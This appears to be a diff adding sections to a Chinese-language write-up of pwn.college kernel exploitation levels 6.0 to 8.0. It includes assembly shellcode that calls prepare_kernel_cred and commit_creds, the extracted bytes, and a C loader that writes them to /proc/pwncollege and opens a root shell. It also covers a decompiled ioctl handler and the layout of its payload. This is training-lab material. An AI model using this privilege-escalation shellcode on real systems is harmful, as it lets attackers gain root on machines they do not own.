@@ -360,3 +360,142 @@ __int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 a
 和上一题基本没区别，改一下 `win` 的地址就好了。
 
 
+## level 6.0
+
+相当于是 kernel shellcode，要求实现之前的 `win` 函数。
+
+直接手写汇编：
+
+```asm
+; gcc -c exp.s -o exp.o
+; ld -e _start -z noexecstack exp.o -o exp
+
+    .intel_syntax noprefix
+    .text
+    .globl  _start
+    .type   _start, @function
+
+_start:
+    push 0xffffffff81089660 ; prepare_kernel_cred
+    pop rbx
+    xor rdi, rdi
+    call rbx
+    push rax
+    pop rdi
+    push 0xffffffff81089310 ; commit_creds
+    pop rbx
+    call rbx
+```
+
+编译得到 exp 可执行文件，然后剥离 shellcode。
+
+```
+$ objcopy -O binary --only-section=.text exp exp.bin
+$ xxd -i exp.bin
+unsigned char exp_bin[] = {
+0x68, 0x60, 0x96, 0x08, 0x81, 0x5b, 0x48, 0x31, 0xff, 0xff, 0xd3, 0x50,
+0x5f, 0x68, 0x10, 0x93, 0x08, 0x81, 0x5b, 0xff, 0xd3
+};
+unsigned int exp_bin_len = 21;
+```
+
+然后编写 exp.c 如下：
+
+```c
+// musl-gcc exp.c -o exp2 -static
+# include <stdio.h>
+# include <fcntl.h>
+# include <stdlib.h>
+# include <unistd.h>
+// prepare: ffffffff81089660
+// commit: ffffffff81089310
+
+unsigned char exp_bin[] = {
+0x68, 0x60, 0x96, 0x08, 0x81, 0x5b, 0x48, 0x31, 0xff, 0xff, 0xd3, 0x50,
+0x5f, 0x68, 0x10, 0x93, 0x08, 0x81, 0x5b, 0xff, 0xd3
+};
+unsigned int exp_bin_len = 21;
+int main() {
+    char flag[100];
+    int fd = open("/proc/pwncollege", 2);
+    printf("%d\n", fd);
+    int res = write(fd, exp_bin, exp_bin_len);
+    printf("%d\n", res);
+    system("/bin/sh");
+    return 0;
+}
+```
+
+然后使用 sftp 将可执行文件传入到远程服务器里执行即可拿到提权后的 shell。
+
+tips：可以在 practice 模式里使用 sudo 查看 kallsyms 里的函数地址（没开 kaslr
+
+## level 6.1
+
+用 6.0 的 exp 直接可以打通。
+
+## level 7.0
+
+```c
+__int64 __fastcall device_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
+{
+  __int64 result; // rax
+  size_t shellcode_length; // [rsp+0h] [rbp-28h] BYREF
+  void (*shellcode_execute_addr[4])(void); // [rsp+8h] [rbp-20h] BYREF
+
+  shellcode_execute_addr[1] = (void (*)(void))__readgsqword(0x28u);
+  printk(&unk_2A0);
+  result = -1LL;
+  if ( cmd == 1337 )
+  {
+    copy_from_user(&shellcode_length, arg, 8LL);
+    copy_from_user(shellcode_execute_addr, arg + 4104, 8LL);
+    result = -2LL;
+    if ( shellcode_length <= 4096 )
+    {
+      copy_from_user(shellcode, arg + 8, shellcode_length);
+      shellcode_execute_addr[0]();
+      return 0LL;
+    }
+  }
+  return result;
+}
+```
+
+相当于要写一个 shellcode，其中：
+
+- shellcode[0:7] 是 shellcode_len
+- shellcode[8:4096+8] 是 shellcode
+- shellcode[4096+8:] 是 shellcode_addr
+
+这里 shellcode_addr 虽然在 ida 里查看到是在模块的 bss 段上，但调试得到地址其实是 0xffffc90000085000。
+
+提权部分依然使用 6.0 的 shellcode，但是注意提权后要 getshell（因为这个 shellcode 不会自动返回），所以最简单的办法是提权后直接 ret。
+
+```asm
+    .intel_syntax noprefix
+    .text
+    .globl  _start
+    .type   _start, @function
+
+_start:
+    push 0xffffffff81089660
+    pop rbx
+    xor rdi, rdi
+    call rbx
+    push rax
+    pop rdi
+    push 0xffffffff81089310
+    pop rbx
+    call rbx
+    ret
+```
+
+剩下都是一样的。
+
+## level 7.1
+
+用 7.0 的 exp 可以打通。
+
+## level 8.0
+
